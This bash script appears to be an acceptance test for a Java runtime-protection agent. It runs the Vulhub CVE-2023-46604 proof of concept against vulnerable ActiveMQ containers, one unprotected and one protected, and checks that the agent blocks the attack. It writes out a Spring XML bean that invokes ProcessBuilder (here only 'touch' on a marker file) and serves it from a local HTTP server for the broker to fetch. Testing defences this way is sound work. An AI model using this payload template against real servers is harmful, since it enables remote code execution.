#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java11/build/libs/ohmyrasp-agent-java11.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java11:agentJava11Jar

image="${OHMYRASP_VULHUB_ACTIVEMQ_46604_IMAGE:-vulhub/activemq:5.17.3}"
baseline_name="${OHMYRASP_VULHUB_ACTIVEMQ_46604_BASELINE_NAME:-ohmyrasp-vulhub-activemq46604-baseline}"
protected_name="${OHMYRASP_VULHUB_ACTIVEMQ_46604_PROTECTED_NAME:-ohmyrasp-vulhub-activemq46604-protected}"
baseline_web_port="${OHMYRASP_VULHUB_ACTIVEMQ_46604_BASELINE_WEB_PORT:-19282}"
baseline_openwire_port="${OHMYRASP_VULHUB_ACTIVEMQ_46604_BASELINE_OPENWIRE_PORT:-19284}"
protected_web_port="${OHMYRASP_VULHUB_ACTIVEMQ_46604_PROTECTED_WEB_PORT:-19283}"
protected_openwire_port="${OHMYRASP_VULHUB_ACTIVEMQ_46604_PROTECTED_OPENWIRE_PORT:-19285}"
http_port="${OHMYRASP_VULHUB_ACTIVEMQ_46604_HTTP_PORT:-19286}"
success_file="/tmp/ohmyrasp-activemq46604-success"
poc_py="${OHMYRASP_VULHUB_ACTIVEMQ_46604_POC:-/tmp/vulhub-ohmyrasp-20260603/activemq/CVE-2023-46604/poc.py}"
baseline_dir="logs/vulhub-activemq-46604-java11-baseline"
protected_dir="logs/vulhub-activemq-46604-java11-protected"
protected_log="${protected_dir}/events.jsonl"
http_pid=""

cleanup() {
  if [[ -n "$http_pid" ]]; then
    kill "$http_pid" >/dev/null 2>&1 || true
    wait "$http_pid" >/dev/null 2>&1 || true
  fi
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_web() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status

  for attempt in $(seq 1 150); do
    status="$(curl -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" != "000" ]]; then
      printf 'web_ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose ActiveMQ web console at ${port}" >&2
  exit 1
}

wait_for_openwire() {
  local name="$1"
  local port="$2"
  local dir="$3"

  for attempt in $(seq 1 90); do
    if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
      printf 'openwire_ready_attempt=%s\n' "$attempt" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose OpenWire at ${port}" >&2
  exit 1
}

wait_for_agent_startup() {
  for attempt in $(seq 1 60); do
    if grep -Fq '"event":"ohmyrasp-java11-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "$protected_log" >&2 || true
  docker logs "$protected_name" >&2 || true
  echo "missing Java 11 agent startup event for ActiveMQ CVE-2023-46604" >&2
  exit 1
}

run_poc() {
  local port="$1"
  local dir="$2"
  local status

  if [[ ! -s "$poc_py" ]]; then
    echo "Vulhub ActiveMQ CVE-2023-46604 poc.py not found at ${poc_py}" >&2
    exit 1
  fi

  set +e
  python3 "$poc_py" \
    127.0.0.1 "$port" "http://host.docker.internal:${http_port}/poc.xml" \
    > "${dir}/poc.log" 2>&1
  status=$?
  set -e
  printf 'poc_status=%s\n' "$status" >> "${dir}/attempts.log"
}

start_http_server() {
  cat > "${baseline_dir}/http/poc.xml" <<XML
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>touch</value>
                <value>${success_file}</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
XML
  python3 -m http.server "$http_port" --bind 0.0.0.0 --directory "${baseline_dir}/http" \
    > "${baseline_dir}/http-server.log" 2>&1 &
  http_pid="$!"

  for attempt in $(seq 1 30); do
    if curl -fsS "http://127.0.0.1:${http_port}/poc.xml" >/dev/null 2>&1; then
      printf 'http_server_ready_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  echo "temporary HTTP server did not expose poc.xml on ${http_port}" >&2
  exit 1
}

run_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host=host.docker.internal:host-gateway \
    -p "${baseline_web_port}:8161" \
    -p "${baseline_openwire_port}:61616" \
    "$image" >/dev/null

  wait_for_web "$baseline_name" "$baseline_web_port" "$baseline_dir"
  wait_for_openwire "$baseline_name" "$baseline_openwire_port" "$baseline_dir"
  docker exec "$baseline_name" rm -f "$success_file"
  run_poc "$baseline_openwire_port" "$baseline_dir"

  for attempt in $(seq 1 15); do
    if docker exec "$baseline_name" test -e "$success_file"; then
      printf 'baseline_marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
      docker rm -f "$baseline_name" >/dev/null 2>&1 || true
      return
    fi
    sleep 1
  done

  cat "${baseline_dir}/poc.log" >&2 || true
  docker logs "$baseline_name" >&2 || true
  cat "${baseline_dir}/http-server.log" >&2 || true
  echo "baseline ActiveMQ CVE-2023-46604 did not create ${success_file}" >&2
  exit 1
}

run_protected() {
  docker run -d --name "$protected_name" \
    --add-host=host.docker.internal:host-gateway \
    -p "${protected_web_port}:8161" \
    -p "${protected_openwire_port}:61616" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java11.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java11.jar -Dohmyrasp.java11.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java11.block=true" \
    "$image" >/dev/null

  wait_for_web "$protected_name" "$protected_web_port" "$protected_dir"
  wait_for_openwire "$protected_name" "$protected_openwire_port" "$protected_dir"
  wait_for_agent_startup
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected ActiveMQ CVE-2023-46604 produced a detection before exploit traffic" >&2
    exit 1
  fi

  docker exec "$protected_name" rm -f "$success_file"
  run_poc "$protected_openwire_port" "$protected_dir"
  sleep 3

  if docker exec "$protected_name" test -e "$success_file"; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    echo "protected ActiveMQ CVE-2023-46604 created ${success_file}" >&2
    exit 1
  fi
  if ! grep -Eq '"algorithm":"java11_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    echo "missing java11_command_execution_exploit_primitive block event for ActiveMQ CVE-2023-46604" >&2
    exit 1
  fi
  if ! grep -Fq "touch ${success_file}" "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "ActiveMQ CVE-2023-46604 block event did not include the Spring XML ProcessBuilder command" >&2
    exit 1
  fi
  printf 'protected_marker=absent\n' >> "${protected_dir}/attempts.log"
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "${baseline_dir}/http" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker image inspect "$image" >/dev/null 2>&1 || docker pull "$image" >/dev/null
docker image inspect "$image" --format '{{json .Config.Env}}' > "${baseline_dir}/image-env.json"
docker run --rm --entrypoint sh "$image" -lc '${JAVA_HOME:-/usr/local/openjdk-11}/bin/java -version' \
  > "${baseline_dir}/java-version.log" 2>&1

start_http_server
run_baseline
run_protected

echo "vulhub ActiveMQ CVE-2023-46604 Java11 acceptance passed"
